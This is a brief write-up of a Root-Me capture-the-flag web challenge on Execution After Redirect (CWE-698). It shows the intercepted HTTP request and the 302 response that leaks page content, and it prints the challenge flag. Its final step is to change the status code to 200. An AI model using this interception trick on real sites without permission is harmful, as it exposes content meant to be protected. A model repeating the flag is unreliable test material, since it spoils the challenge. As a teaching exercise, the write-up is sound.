# HTTP - Improper redirect(EAR)

Sound like this one relates with EAR(execution after redirection)

***

Request

GET /web-serveur/ch32/index.php HTTP/1.1 Host: challenge01.root-me.org User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:91.0) Gecko/20100101 Firefox/91.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,_/_;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: close Cookie: \_ga\_SRYSKX09J7=GS1.1.1661155511.14.1.1661155942.0.0.0; \_ga=GA1.1.536088429.1661133467 Upgrade-Insecure-Requests: 1

***

Response

HTTP/1.1 302 Found Server: nginx Date: Mon, 22 Aug 2022 08:15:47 GMT Content-Type: text/html; charset=UTF-8 Connection: close Location: ./login.php?redirect Content-Length: 547

## Welcome !

Yeah ! The redirection is OK, but without exit() after the header('Location: ...'), PHP just continue the execution and send the page content !...

[CWE-698: Execution After Redirect (EAR)](http://cwe.mitre.org/data/definitions/698.html)

The flag is : ExecutionAfterRedirectIsBad

***

Then capture the server's response and change 302 found -> 200 ok
